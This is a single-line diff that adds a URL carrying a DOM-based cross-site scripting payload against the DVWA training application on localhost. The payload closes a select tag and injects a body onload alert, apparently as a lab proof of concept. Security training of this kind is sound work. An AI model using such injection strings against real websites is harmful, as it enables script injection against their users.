@@ -1,0 +1,1 @@
+http://127.0.0.1/DVWA/vulnerabilities/xss_d/?default=English</select><body onload=alert('XSS')>
